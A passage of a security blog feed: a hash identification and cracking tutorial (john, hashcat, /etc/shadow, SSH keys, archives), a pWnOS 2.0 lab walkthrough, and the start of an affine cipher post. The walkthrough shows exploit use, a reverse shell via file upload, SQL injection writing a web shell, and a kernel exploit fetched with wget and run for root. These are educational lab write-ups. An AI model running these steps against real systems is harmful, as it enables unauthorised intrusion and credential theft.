Tiger-128(HMAC)[+]  md5($pass.$salt)[+]  md5($salt.$pass)[+]  md5($salt.$pass.$salt)[+]  md5($salt.$pass.$username)[+]  md5($salt.md5($pass))[+]  md5($salt.md5($pass))[+]  md5($salt.md5($pass.$salt))[+]  md5($salt.md5($pass.$salt))[+]  md5($salt.md5($salt.$pass))[+]  md5($salt.md5(md5($pass).$salt))[+]  md5($username.0.$pass)[+]  md5($username.LF.$pass)[+]  md5($username.md5($pass).$salt)[+]  md5(md5($pass))[+]  md5(md5($pass).$salt)[+]  md5(md5($pass).md5($salt))[+]  md5(md5($salt).$pass)[+]  md5(md5($salt).md5($pass))[+]  md5(md5($username.$pass).$salt)[+]  md5(md5(md5($pass)))[+]  md5(md5(md5(md5($pass))))[+]  md5(md5(md5(md5(md5($pass)))))[+]  md5(sha1($pass))[+]  md5(sha1(md5($pass)))[+]  md5(sha1(md5(sha1($pass))))[+]  md5(strtoupper(md5($pass)))</code></pre><p>As you can see the hash is probably MD5 or Domain Cached Credentials, but besides these, the tool also prints least possible hashes.</p><h3 id="The-hashid"><a href="#The-hashid" class="headerlink" title="The hashid"></a>The hashid</h3><p>The other tool is <code>hashid</code>, which has a little more functionality. The best thing about this tool is that it can print the corresponding hashcat  mode code and john format.</p><pre><code>root@kali:~# hashid -m -j &apos;48bb6e862e54f2a795ffc4e541caed4d&apos;Analyzing &apos;48bb6e862e54f2a795ffc4e541caed4d&apos;[+] MD2 [JtR Format: md2][+] MD5 [Hashcat Mode: 0][JtR Format: raw-md5][+] MD4 [Hashcat Mode: 900][JtR Format: raw-md4][+] Double MD5 [Hashcat Mode: 2600][+] LM [Hashcat Mode: 3000][JtR Format: lm][+] RIPEMD-128 [JtR Format: ripemd-128][+] Haval-128 [JtR Format: haval-128-4][+] Tiger-128[+] Skein-256(128)[+] Skein-512(128)[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600][JtR Format: lotus5][+] Skype [Hashcat Mode: 23][+] Snefru-128 [JtR Format: snefru-128][+] NTLM [Hashcat Mode: 1000][JtR Format: nt][+] Domain Cached Credentials [Hashcat Mode: 1100][JtR Format: mscach][+] Domain Cached Credentials 2 [Hashcat Mode: 2100][JtR Format: mscach2][+] DNSSEC(NSEC3) [Hashcat Mode: 8300][+] RAdmin v2.x [Hashcat Mode: 9900][JtR Format: radmin]</code></pre><p>I provided the same as in the previous example, but the first possible hash is MD2 and only the second is correct. It’s a small price to pay, but still… you might have to try 3-5 type until one of them is correct and trust me it’s not a quick process with a large dictionary.</p><h3 id="The-HashTag"><a href="#The-HashTag" class="headerlink" title="The HashTag"></a>The HashTag</h3><p>The third tool is not in Kali’s repository, you can find it on Github: <a href="https://github.com/SmeegeSec/HashTag" target="_blank" rel="noopener">https://github.com/SmeegeSec/HashTag</a> HashTag supports the identification of over 250 hash types along with matching them to over 110 hashcat modes. The only downside is, it was created 5 years ago and hasn’t been updated/maintained since.</p><pre><code>root@kali:~# python HashTag.py -sh &apos;48bb6e862e54f2a795ffc4e541caed4d&apos;Hash: 48bb6e862e54f2a795ffc4e541caed4d[*] MD5 - Hashcat Mode 0[*] NTLM - Hashcat Mode 1000[*] MD4 - Hashcat Mode 900[*] LM - Hashcat Mode 3000[*] RAdmin v2.x[*] Haval-128[*] MD2[*] RipeMD-128[*] Tiger-128[*] Snefru-128[*] MD5(HMAC)[*] MD4(HMAC)[*] Haval-128(HMAC)[*] RipeMD-128(HMAC)[*] Tiger-128(HMAC)[*] Snefru-128(HMAC)[*] MD2(HMAC)[*] MD5(ZipMonster)[*] MD5(HMAC(Wordpress))[*] Skein-256(128)[*] Skein-512(128)[*] md5($pass.$salt) - Hashcat Mode 10[*] md5($pass.$salt.$pass)[*] md5($pass.md5($pass))[*] md5($salt.$pass) - Hashcat Mode 20[*] md5($salt.$pass.$salt) - Hashcat Mode 3810[*] md5($salt.$pass.$username)[*] md5($salt.&apos;-&apos;.md5($pass))[*] md5($salt.md5($pass)) - Hashcat Mode 3710[*] md5($salt.md5($pass).$salt)[*] md5($salt.MD5($pass).$username)[*] md5($salt.md5($pass.$salt)) - Hashcat Mode 4110[*] md5($salt.md5($salt.$pass)) - Hashcat Mode 4010[*] md5($salt.md5(md5($pass).$salt))[*] md5($username.0.$pass) - Hashcat Mode 4210[*] md5($username.LF.$pass)[*] md5($username.md5($pass).$salt)[*] md5(1.$pass.$salt)[*] md5(3 x strtoupper(md5($pass)))[*] md5(md5($pass)), Double MD5[*] md5(md5($pass).$pass)[*] md5(md5($pass).$salt), vBulletin &lt; v3.8.5[*] md4($salt.$pass)[*] md4($pass.$salt)md5(md5($pass).md5($pass))[*] md5(md5($pass).md5($salt)) - Hashcat Mode 3910[*] md5(md5($salt).$pass) - Hashcat Mode 3610[*] md5(md5($salt).md5($pass))[*] md5(md5($username.$pass).$salt)[*] md5(md5(base64_encode($pass)))[*] md5(md5(md5($pass))) - Hashcat Mode 3500[*] md5(md5(md5(md5($pass))))[*] md5(md5(md5(md5(md5($pass)))))[*] md5(sha1($pass)) - Hashcat Mode 4400[*] md5(sha1(base64_encode($pass)))[*] md5(sha1(md5($pass)))[*] md5(sha1(md5($pass)).sha1($pass))[*] md5(sha1(md5(sha1($pass))))[*] md5(strrev($pass))[*] md5(strrev(md5($pass)))[*] md5(strtoupper(md5($pass))) - Hashcat Mode 4300[*] md5(strtoupper(md5(strtoupper(md5(strtoupper(md5($pass)))))))[*] strrev(md5($pass))[*] strrev(md5(strrev(md5($pass))))[*] 6 x md5($pass)[*] 7 x md5($pass)[*] 8 x md5($pass)[*] 9 x md5($pass)[*] 10 x md5($pass)[*] 11 x md5($pass)[*] 12 x md5($pass)</code></pre><p>This time the hash type is correct and we also got the hashcat mode number. I prefer working from a terminal, but in case you are not there is an excellent site, where you can identify and also crack hashes. The site uses the same script, so you should get the exact same result. Link: <a href="https://www.onlinehashcrack.com/" target="_blank" rel="noopener">https://www.onlinehashcrack.com/</a> The hash identifier is under <code>Tools -&gt; Other -&gt; Hash identification</code>.</p><p><img src="onlinehc.png" alt></p><div class="addthis_tipjar_inline"></div><h1 id="Cracking-different-hashes"><a href="#Cracking-different-hashes" class="headerlink" title="Cracking different hashes"></a>Cracking different hashes</h1><p> Another great site is <a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a>, where you can check your hash against their pre-computed lookup tables. These sites are quite good, quick and some of them don’t even require the hash type just the hash.  </p><h3 id="Linux-passwords"><a href="#Linux-passwords" class="headerlink" title="Linux passwords"></a>Linux passwords</h3><p>Let’s say, you acquired root access to a Linux server. That’s all cool, but you want to know how secure are the passwords used on the box. In order to match the usernames with the cracked passwords, you’ll need the <code>/etc/shadow</code> and the <code>/etc/passwd</code> file. The <code>unshadow</code> command basically combines the data of these two files and creates a third one username and password details. The usage:</p><pre><code>unshadow passwd_file shadow_file &gt; crack_me</code></pre><p>Now, we can use <code>john</code> crack the passwords.</p><pre><code>john crack_me</code></pre><p>If you don’t specify a wordlist, it’ll use the default one. It’s alright for easy passwords, but I recommend using something bigger like <code>rockyou.txt</code>. Anyway, we can use the <code>--show</code> switch with the file name to see the cracked passwords like this:</p><pre><code>john --show crack_me</code></pre><h3 id="NTLM-hashes"><a href="#NTLM-hashes" class="headerlink" title="NTLM hashes"></a>NTLM hashes</h3><p>NTLM hashes are old and shouldn’t be used, but I wanted to include something Windows related. Let’s assume you have successfully extracted some NTLM hashes with Cain and Abel. You could use <code>john</code> for this with <code>john --format=nt hashes.txt</code> as well, but this time let’s use hashcat to broaden our knowledge.</p><pre><code>$ ./hashcat64.exe -m 1000 hash.txt rockyou.txthashcat (v5.1.0) starting...OpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 1070 Ti, 2048/8192 MB allocatable, 19MCUHashes: 2 digests; 2 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Zero-Byte* Early-Skip* Not-Salted* Not-Iterated* Single-Salt* Raw-HashMinimum password length supported by the kernel: 0Maximum password length supported by the kernel: 256Watchdog: Temperature abort trigger set to 90cDictionary cache hit:* Filename..: rockyou.txt* Passwords.: 14344384* Bytes.....: 139921497* Keyspace..: 14344384427f638942987bcbeb98697797d95426:sesame363dd639ad34b6c5153c0f51165ab830:crackmeSession..........: hashcatStatus...........: CrackedHash.Type........: NTLMHash.Target......: hash.txtGuess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 46867.1 kH/s (3.46ms) @ Accel:1024 Loops:1 Thr:64 Vec:1Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) SaltsProgress.........: 1245184/14344384 (8.68%)Rejected.........: 0/1245184 (0.00%)Restore.Point....: 0/14344384 (0.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: 123456 -&gt; swethyHardware.Mon.#1..: Temp: 49c Fan:  0% Util: 21% Core:1607MHz Mem:3802MHz Bus:16</code></pre><h3 id="Cracking-SSH-keys"><a href="#Cracking-SSH-keys" class="headerlink" title="Cracking SSH keys"></a>Cracking SSH keys</h3><p>We need to convert the private SSH key into a new format that <code>john</code> understands.</p><pre><code>ssh2john id_rsa &gt; crack_me</code></pre><p>Now, just supply the new file to <code>john</code> as a parameter.</p><pre><code>john crack_me</code></pre><h3 id="RAR-and-ZIP-passwords"><a href="#RAR-and-ZIP-passwords" class="headerlink" title="RAR and ZIP passwords"></a>RAR and ZIP passwords</h3><p>This method is very similar to the previous one, but here we extract hashes from a zip or rar file.</p><pre><code>rar2john file.rar &gt; crack_mezip2john file.zip &gt; crack_me</code></pre><p>After we have the file containing the hash, we run <code>john</code> directly on it.</p><pre><code>john crack_me</code></pre><p>If <code>zip2john</code> doesn’t yield success, you can try to perform a dictionary attack with <code>fcrackzip</code>. It’s a very handy tool and has many command line options. Here, I used <code>-v</code> (verbose output), <code>-D</code> (use a dictionary), <code>-u</code> (use unzip to weed out wrong passwords) and finally <code>-p</code>, which means we are using a password file.</p><pre><code>fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt file.zip</code></pre><h3 id="Blowfish-hashes"><a href="#Blowfish-hashes" class="headerlink" title="Blowfish hashes"></a>Blowfish hashes</h3><p>Sometimes, Capture The Flag games try to make you struggle by choosing a type hash that can’t be found on online cracking sites or not really conventional.<br>Once, I was faced with the following hash: <code>$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom</code> I couldn’t determine the type of the hash just by looking at it and this is where the importance of hash identification comes into place. With the correct information, the rest is exactly the same with NTLM hashes, except the hashcat mode of course.  </p><pre><code>$ ./hashcat64.exe -m 3200 hash.txt rockyou.txthashcat (v5.1.0) starting...OpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 1070 Ti, 2048/8192 MB allocatable, 19MCUHashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Zero-Byte* Single-Hash* Single-SaltWatchdog: Temperature abort trigger set to 90cDictionary cache built:* Filename..: rockyou.txt* Passwords.: 14344391* Bytes.....: 139921497* Keyspace..: 14344384* Runtime...: 1 secSession..........: hashcatStatus...........: RunningHash.Type........: bcrypt $2*$, Blowfish (Unix)Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRomGuess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:      111 H/s (5.24ms) @ Accel:8 Loops:2 Thr:8 Vec:1Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) SaltsProgress.........: 3648/14344384 (0.03%)Rejected.........: 0/3648 (0.00%)Restore.Point....: 3648/14344384 (0.03%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2606-2608Candidates.#1....: 19871987 -&gt; darylHardware.Mon.#1..: Temp: 47c Fan:  0% Util: 98% Core:1873MHz Mem:3802MHz Bus:16[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;Session..........: hashcatStatus...........: RunningHash.Type........: bcrypt $2*$, Blowfish (Unix)Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRomGuess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:      110 H/s (5.28ms) @ Accel:8 Loops:2 Thr:8 Vec:1Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) SaltsProgress.........: 170240/14344384 (1.19%)Rejected.........: 0/170240 (0.00%)Restore.Point....: 170240/14344384 (1.19%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1752-1754Candidates.#1....: ketzal -&gt; hateguysHardware.Mon.#1..: Temp: 56c Fan: 27% Util: 98% Core:1860MHz Mem:3802MHz Bus:16$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom:blehSession..........: hashcatStatus...........: CrackedHash.Type........: bcrypt $2*$, Blowfish (Unix)Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRomGuess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:      110 H/s (5.29ms) @ Accel:8 Loops:2 Thr:8 Vec:1Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) SaltsProgress.........: 175104/14344384 (1.22%)Rejected.........: 0/175104 (0.00%)Restore.Point....: 173888/14344384 (1.21%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4094-4096Candidates.#1....: bnasty -&gt; ROSESHardware.Mon.#1..: Temp: 56c Fan: 27% Util: 98% Core:1860MHz Mem:3802MHz Bus:16</code></pre><p>My goal here was not to list all the hashes but to give you an understanding of how to identify hashes and plan your next move after that. You can find sample hashes and dumps online or even better generate your own and try to crack it. Experiment with different types of hashes and hashcat modes. Read the man page of <code>john</code> and <code>hashcat</code> to see what else they can do. The best way to learn is by doing!</p><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> Penetration Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cracking </tag>
            
            <tag> hashes </tag>
            
            <tag> penetration testing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pWnOS 2.0 - Walkthrough</title>
      <link href="/2019/01/09/pWnOS-2-0-Walkthrough/"/>
      <url>/2019/01/09/pWnOS-2-0-Walkthrough/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="pwnos2.0.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>I know, it’s a very old machine (2011), but I was just searching for OSCP like Vulnhub boxes and I saw this machine mentioned in a blog post. Since I’m trying to prepare for that certification, I thought it might be a good idea to do some older boxes for practice. The goal of the machine is to get root, so there are no flags. Note that this machine won’t work with VirtualBox out of the box. I had to create a NAT network within the 10.10.10.0/24 network range and configure both VM to use this network.<br>Download it from here: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/" target="_blank" rel="noopener">pWnOS 2.0 on Vulnhub</a></p><h2 id="Port-scanning"><a href="#Port-scanning" class="headerlink" title="Port scanning"></a>Port scanning</h2><pre><code>root@kali:~# nmap -A -sC -F 10.10.10.100Nmap scan report for 10.10.10.100Host is up (0.00019s latency).Not shown: 98 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set| http-server-header: Apache/2.2.17 (Ubuntu)| http-title: Welcome to this Site!MAC Address: 08:00:27:60:1C:37 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 2.6.XOS CPE: cpe:/o:linux:linux_kernel:2.6OS details: Linux 2.6.32 - 2.6.39Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.19 ms 10.10.10.100</code></pre><p>Usual stuff, let’s investigate on the web server using <code>dirb</code>.</p><h2 id="Busting-directories"><a href="#Busting-directories" class="headerlink" title="Busting directories"></a>Busting directories</h2><p>I tend to use dirb, but there are other tools for this purpose, like nikto or dirbuster. Anyway, here is the result:</p><pre><code>root@kali:~# dirb http://10.10.10.100-----------------DIRB v2.22    By The Dark Raver-----------------URL_BASE: http://10.10.10.100/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://10.10.10.100/ ----+ http://10.10.10.100/activate (CODE:302|SIZE:0)                               ==&gt; DIRECTORY: http://10.10.10.100/blog/                                       + http://10.10.10.100/cgi-bin/ (CODE:403|SIZE:288)                            ==&gt; DIRECTORY: http://10.10.10.100/includes/                                   + http://10.10.10.100/index (CODE:200|SIZE:854)                                + http://10.10.10.100/index.php (CODE:200|SIZE:854)                            + http://10.10.10.100/info (CODE:200|SIZE:50171)                               + http://10.10.10.100/info.php (CODE:200|SIZE:50040)                           + http://10.10.10.100/login (CODE:200|SIZE:1174)                               + http://10.10.10.100/register (CODE:200|SIZE:1562)                            + http://10.10.10.100/server-status (CODE:403|SIZE:293)                        ---- Entering directory: http://10.10.10.100/blog/ ----+ http://10.10.10.100/blog/add (CODE:302|SIZE:0)                               + http://10.10.10.100/blog/atom (CODE:200|SIZE:1062)                           + http://10.10.10.100/blog/categories (CODE:302|SIZE:0)                        ==&gt; DIRECTORY: http://10.10.10.100/blog/config/                                + http://10.10.10.100/blog/contact (CODE:200|SIZE:5918)                        ==&gt; DIRECTORY: http://10.10.10.100/blog/content/                          ==&gt; DIRECTORY: http://10.10.10.100/blog/docs/                                  ==&gt; DIRECTORY: http://10.10.10.100/blog/flash/                                 ==&gt; DIRECTORY: http://10.10.10.100/blog/images/                                + http://10.10.10.100/blog/index (CODE:200|SIZE:8094)                          + http://10.10.10.100/blog/index.php (CODE:200|SIZE:8094)                      + http://10.10.10.100/blog/info (CODE:302|SIZE:0)                              + http://10.10.10.100/blog/info.php (CODE:302|SIZE:0)                          ==&gt; DIRECTORY: http://10.10.10.100/blog/interface/                             ==&gt; DIRECTORY: http://10.10.10.100/blog/languages/                             + http://10.10.10.100/blog/login (CODE:200|SIZE:5667)                          + http://10.10.10.100/blog/logout (CODE:302|SIZE:0)                            + http://10.10.10.100/blog/options (CODE:302|SIZE:0)                           + http://10.10.10.100/blog/rdf (CODE:200|SIZE:1411)                            + http://10.10.10.100/blog/rss (CODE:200|SIZE:1237)                            ==&gt; DIRECTORY: http://10.10.10.100/blog/scripts/                               + http://10.10.10.100/blog/search (CODE:200|SIZE:4951)                         + http://10.10.10.100/blog/setup (CODE:302|SIZE:0)                             + http://10.10.10.100/blog/static (CODE:302|SIZE:0)                            + http://10.10.10.100/blog/stats (CODE:200|SIZE:5309)                          ==&gt; DIRECTORY: http://10.10.10.100/blog/themes/                                + http://10.10.10.100/blog/trackback (CODE:302|SIZE:0)                         + http://10.10.10.100/blog/upgrade (CODE:302|SIZE:0)</code></pre><p>It looks like, there’s is a different site or probably a blog installed under the blog directory. Let’s find out!</p><h2 id="Discovering-the-blog"><a href="#Discovering-the-blog" class="headerlink" title="Discovering the blog"></a>Discovering the blog</h2><p>Yes, it is a basic blog. Page Info helped me to find out, what this site is running.</p><p><img src="pageinfo.png" alt="The Page Info" title="The Page Info"></p><p>As you can see, the generator is <code>Simple PHP Blog 0.4.0</code> and quickly searched for this to see if it has any vulnerabilities. Actually, I found quite a few vulnerabilities. I also searched with searchsploit and decided to use use the first exploit.</p><pre><code>root@kali:~# searchsploit simple PHP blog 0.4.0--------------------------------------------------------------- ------------------------------ Exploit Title                                                 |  Path                                                               | (/usr/share/exploitdb/)--------------------------------------------------------------- ------------------------------Simple PHP Blog 0.4.0 - Multiple Remote s                      | exploits/php/webapps/1191.plSimple PHP Blog 0.4.0 - Remote Command Execution (Metasploit)  | exploits/php/webapps/16883.rb--------------------------------------------------------------- ------------------------------Shellcodes: No Result</code></pre><h2 id="Exploiting-the-blog"><a href="#Exploiting-the-blog" class="headerlink" title="Exploiting the blog"></a>Exploiting the blog</h2><p>I might have overcomplicated the exploitation, but here is how I did it. First, I set a new username and password combination (admin/admin).</p><pre><code>root@kali:~# perl 1191.pl -h http://10.10.10.100/blog -e 3 -U admin -P admin________________________________________________________________________________          SimplePHPBlog v0.4.0 Exploits                 by             Kenneth F. Belva, CISSP            http://www.ftusecurity.com________________________________________________________________________________Running Set New Username and Password Exploit....Deleted File: ./config/password.txt./config/password.txt created!Username is set to: adminPassword is set to: admin*** Exploit Completed....Have a nice day! :)</code></pre><p>Then, I logged in and started looking for oportunities to upload a reverse shell.</p><p><img src="login.png" alt="Login" title="Login"></p><p>Hmmm… Image upload? Hell yess! They didn’t even check the extension… Moreover, there was directory listing enable in the <code>/blog/images</code> directory. So, I could easily select and trigger my PHP reverse shell. Previously, I set up my netcat listening on port 1234 and now I got the connection back I was waiting for.</p><pre><code>root@kali:~# nc -lvp 1234listening on [any] 1234 ...10.10.10.100: inverse host lookup failed: Unknown hostconnect to [10.10.10.4] from (UNKNOWN) [10.10.10.100] 48103Linux web 2.6.38-8-server #42-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux 08:59:11 up 17:51,  0 users,  load average: 0.00, 0.01, 0.03USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: can&apos;t access tty; job control turned off$ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;www-data@web:/$</code></pre><div class="addthis_tipjar_inline"></div><h2 id="Getting-root-access"><a href="#Getting-root-access" class="headerlink" title="Getting root access"></a>Getting root access</h2><p>In the web root, I found a <code>mysqli_connect.php</code> file, but the credentials didn’t work. However, there was a similar file in the <code>/var</code> directory and it was gold!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># Script 8.2 - mysqli_connect.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This file contains the database access information.</span></span><br><span class="line"><span class="comment">// This file also establishes a connection to MySQL</span></span><br><span class="line"><span class="comment">// and selects the database.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the database access information as constants:</span></span><br><span class="line"></span><br><span class="line">DEFINE (<span class="string">'DB_USER'</span>, <span class="string">'root'</span>);</span><br><span class="line">DEFINE (<span class="string">'DB_PASSWORD'</span>, <span class="string">'root@ISIntS'</span>);</span><br><span class="line">DEFINE (<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">DEFINE (<span class="string">'DB_NAME'</span>, <span class="string">'ch16'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the connection:</span></span><br><span class="line"></span><br><span class="line">$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)</span><br><span class="line"><span class="keyword">OR</span> <span class="keyword">die</span> (<span class="string">'Could not connect to MySQL: '</span> . mysqli_connect_error() );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>I mean, the password was actually the root password.</p><pre><code>www-data@web:/var$ su rootsu rootPassword: root@ISIntSroot@web:/var# iduid=0(root) gid=0(root) groups=0(root)</code></pre><p>But, I didn’t stop here. I wanted to find other ways to get in. So, I went back to the original site and started poking around. After I didn’t find anything useful, I registered with a test account.</p><p><img src="registration.png" alt="Registration page" title="Registration page"></p><p>Of course, I fired up Burp Suite to see and modify the requests. I found an SQL injection vulnerability in the email field.</p><p><img src="burp1.png" alt="Locating the SQL injection" title="Locating the SQL injection"><br><img src="burp2.png" alt="How many columns are there?" title="How many columns are there?"><br><img src="burp3.png" alt="Creating a file to run commands" title="Creating a file to run commands"></p><p>I should note here, that on the picture I named the PHP file as <code>shell.php</code>, but I successfully messed things up and I ended with another file named <code>cmd.php</code>.</p><p><img src="cmd.png" alt="Running commands" title="Running commands"></p><h2 id="Getting-root-again"><a href="#Getting-root-again" class="headerlink" title="Getting root again"></a>Getting root again</h2><p>I thought, there must be another way in like a kernel exploit. I started searching and trying out different exploits until I found a working one. Launched my local web server and delivered the source code. I knew, there was a gcc compiler on the machine so all I had to do is transfer the code, compile and run.</p><pre><code>$ wget http://10.10.10.4:8000/25444.c--2019-01-09 12:27:14--  http://10.10.10.4:8000/25444.cConnecting to 10.10.10.4:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 2835 (2.8K) [text/plain]Saving to: `25444.c&apos;     0K ..                                                    100%  568M=0s2019-01-09 12:27:14 (568 MB/s) - `25444.c&apos; saved [2835/2835]$ ls25444.c$ gcc -O2 25444.c$ chmod +x a.out$ python -c &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot;www-data@web:/tmp$ ./a.out2.6.37-3.x x86_64sd@fucksheep.org 2010root@web:/tmp# iduid=0(root) gid=0(root) groups=0(root),33(www-data)root@web:/tmp#</code></pre><h2 id="Before-you-go"><a href="#Before-you-go" class="headerlink" title="Before you go"></a>Before you go</h2><p>If you found this article helpful, please share to help others with similar interest find it! + Feedback and donations are always welcome!</p><p><br><div align="center" class="addthis_inline_share_toolbox"></div><br></p>]]></content>
      
      
      <categories>
          
          <category> CTF Walkthroughs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> ctf </tag>
            
            <tag> walkthrough </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The Affine Cipher</title>
      <link href="/2018/12/24/The-Affine-Cipher/"/>
      <url>/2018/12/24/The-Affine-Cipher/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script><p><img src="affine_cipher.png" alt></p><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><blockquote><p>The affine cipher is a type of monoalphabetic substitution cipher, wherein each letter in an alphabet is mapped to its numeric equivalent, encrypted using a simple mathematical function, and converted back to a letter. The formula used means that each letter encrypts to one other letter, and back again, meaning the cipher is essentially a standard substitution cipher with a rule governing which letter goes to which. As such, it has the weaknesses of all substitution ciphers.</p></blockquote><center>- - - - - - - - - -</center><h2 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h2><p>Each letter is enciphered with the function <code>(a * x + b) mod 26</code>, where b is the magnitude of the shift. Let’s say we have a word “secret” and we want to encrypt it with <code>a = 5</code> and <code>b = 7</code>. These numbers are basically the encryption key.</p><p>Now, we have to take the word letter by letter and find the position of every letter in the ABC. Keep in mind that counting starts from 0! Let me help you with the following table:</p><p><br></p><table><thead><tr><th>A</th><th style="text-align:center">B</th><th style="text-align:center">C</th><th style="text-align:center">D</th><th style="text-align:center">E</th><th style="text-align:center">F</th><th style="text-align:center">G</th><th style="text-align:center">H</th><th style="text-align:center">I</th><th style="text-align:center">J</th><th style="text-align:center">K</th><th style="text-align:center">L</th><th style="text-align:center">M</th><th style="text-align:center">N</th><th style="text-align:center">O</th><th style="text-align:center">P</th><th style="text-align:center">Q</th><th style="text-align:center">R</th><th style="text-align:center">S</th><th style="text-align:center">T</th><th style="text-align:center">U</th><th style="text-align:center">V</th><th style="text-align:center">W</th><th style="text-align:center">X</th><th style="text-align:center">Y</th><th style="text-align:left">Z</th></tr></thead><tbody><tr><td>0</td><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:center">3</td><td style="text-align:center">4</td><td style="text-align:center">5</td><td style="text-align:center">6</td><td style="text-align:center">7</td><td style="text-align:center">8</td><td style="text-align:center">9</td><td style="text-align:center">10</td><td style="text-align:center">11</td><td style="text-align:center">12</td><td style="text-align:center">13</td><td style="text-align:center">14</td><td style="text-align:center">15</td><td style="text-align:center">16</td><td style="text-align:center">17</td><td style="text-align:center">18</td><td style="text-align:center">19</td><td style="text-align:center">20</td><td style="text-align:center">21</td><td style="text-align:center">22</td><td style="text-align:center">23</td><td style="text-align:center">24</td><td style="text-align:left">25</td></tr></tbody></table><p><br></p><p>All we have to do is substitute these number into the formula. The result will be the position of the encrypted letter in the ABC.</p><p><strong>Plain text message:</strong></p><table><thead><tr><th style="text-align:center">s</th><th style="text-align:center">e</th><th style="text-align:center">c</th><th style="text-align:center">r</th><th style="text-align:center">e</th><th style="text-align:center">t</th></tr></thead><tbody><tr><td style="text-align:center">18</td><td style="text-align:center">4</td><td 